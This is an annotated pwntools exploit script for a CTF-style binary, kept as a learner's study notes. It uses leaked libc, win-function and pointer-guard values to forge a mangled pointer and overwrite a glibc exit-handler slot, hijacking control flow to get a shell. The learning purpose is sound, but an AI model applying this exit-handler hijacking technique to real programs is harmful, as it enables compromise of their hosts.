from pwn import * # library designed for exploit development and CTF challenges

p = process("./hook")
gdb.attach(p, "b exit")
#when i look at those 2 lines, im thinking: they are saying p is process in the hook in the current location. 
#and gdb is attached to the process, i mean to its exit? gdb is a debugger
"""
p = process("./hook") - uses pwntools to start the ./hook binary and store the handle in p so the script can talk to the target (send/recv).
it's kind of like a remote control to see what the program will do if i do certain actions.

gdb.attach(p, "b exit") — attaches GDB to that running process and immediately runs the gdb command b exit (set a breakpoint at the exit symbol). 
It’s attaching the debugger to the process, not to exit itself — the breakpoint just pauses execution when the program calls exit, 
so you can inspect memory/registers then.
ok got it kind sir (chatgpt) ^_^
"""

"""
def PTR_MANGLE(addr):
    return rotate_shift_left(xor(addr, pointer_guard), 0x11)

#XOR allows you to easily encrypt and decrypt a string, the other logic operations don't. See 'Cryptography' repo !!!!COMING SOON!!!!
#(xor(addr, pointer_guard) - mixes the address with the secret value (pointer_guard).
#rotate_shift_left (모모, 0x11) - rotates 모모 left by 0x11(17) bits. !!!Revise converting to binaries!!!
#mangle means severely mutilated
"""

def rorl(x, y):
    return ((x << y) | (x >> (64 - y))) & 0xFFFF_FFFF_FFFF_FFFF
#hm.. rotate... OR... what are those FFFFs...
"""
That function implements a 64-bit rotate-left of x by y bits and then forces the result back into 64 bits.
x << y -> shift x left by y bits (moves bits left, new low bits = 0).
| is bitwise OR — it merges those two parts together so you get the rotated result.
& 0xFFFF_FFFF_FFFF_FFFF masks off anything above 64 bits so the result fits in 64 bits.

!!!READ https://www.ibm.com/docs/en/aix/7.1.0?topic=constants-arithmetic!!!
!!!PWNTOOLS BASICS IN MY REPO!!!
!!!BASE64 (encoding algorithm) See 'Cryptography' repo!!!

"""

def mangle(addr):
    return rorl(addr ^ PTR_GUARD, 0x11)
#this was addressed in lines 18-24
"""recvuntil(delims, drop=False, timeout=default) -> bytes

        Receive data until one of `delims` is encountered.

        If the request is not satisfied before ``timeout`` seconds pass,
        all data is buffered and an empty string (``''``) is returned.

        arguments:
            delims(bytes,tuple): Byte-string of delimiters characters, or list of delimiter byte-strings.
            drop(bool): Drop the ending.  If :const:`True` it is removed from the end of the return value.

        Raises:
            exceptions.EOFError: The connection closed before the request could be satisfied

        Returns:
            A string containing bytes received from the socket,
            or ``''`` if a timeout occurred while waiting.
            https://github.com/Gallopsled/pwntools/blob/77b4f06b07/pwnlib/tubes/tube.py#L281-L369"""

"""recvline(keepends=True, timeout=default) -> bytes

        Receive a single line from the tube.

        A "line" is any sequence of bytes terminated by the byte sequence
        set in :attr:`newline`, which defaults to ``b'\n'``.

        If the connection is closed (:class:`EOFError`) before a newline
        is received, the buffered data is returned by default and a warning
        is logged. If the buffer is empty, an :class:`EOFError` is raised.
        This behavior can be changed by setting :meth:`pwnlib.context.ContextType.throw_eof_on_incomplete_line`.

        If the request is not satisfied before ``timeout`` seconds pass,
        all data is buffered and an empty byte string (``b''``) is returned.

        Arguments:
            keepends(bool): Keep the line ending (:const:`True`).
            timeout(int): Timeout

        Raises:
            :class:`EOFError`: The connection closed before the request
                                 could be satisfied and the buffer is empty

        Return:
            All bytes received over the tube until the first
            newline ``'\n'`` is received.  Optionally retains
            the ending. If the connection is closed before a newline
            is received, the remaining data received up to this point
            is returned."""

p.recvuntil(b": 0x") #Waits and reads (consumes) everything from the process output up to and including the exact bytes : 0x. It stops right after the 0x, so the next read will start with the hex digits.
libc = int(p.recvline(keepends=False).decode(), 16) - 0x29CA8 #Reads the rest of that line (until \n). keepends=False removes the trailing \n from the returned bytes.

p.recvuntil(b": 0x")
win_leak = int(p.recvline(keepends=False).decode(), 16)

p.recvuntil(b": 0x")
PTR_GUARD = int(p.recvline(keepends=False).decode(), 16) # i suppose it is for mangling..
#at first i thought they are all very similar.. and they are, but in libc 0x29CA8 is substracted.. to convert to the libc base?

# !!! https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef !!!

initial = libc + 0x1E9000
payload = mangle(win_leak) # create the mangled form of win_leak (addr ^ PTR_GUARD, rotate left 17)
"""
sendafter is a combination of ``recvuntil(delim, timeout=timeout)`` and ``send(data)``.
"""
p.sendafter(b": ", p64(initial + 0x18)) # wait for ": " then send 8-byte little-endian address of the target slot (initial+0x18)
p.sendafter(b": ", p64(payload)) # wait for ": " then send the 8-byte mangled pointer to be written there

p.interactive() # give you interactive control (so you can use a shell if exploit succeeds)
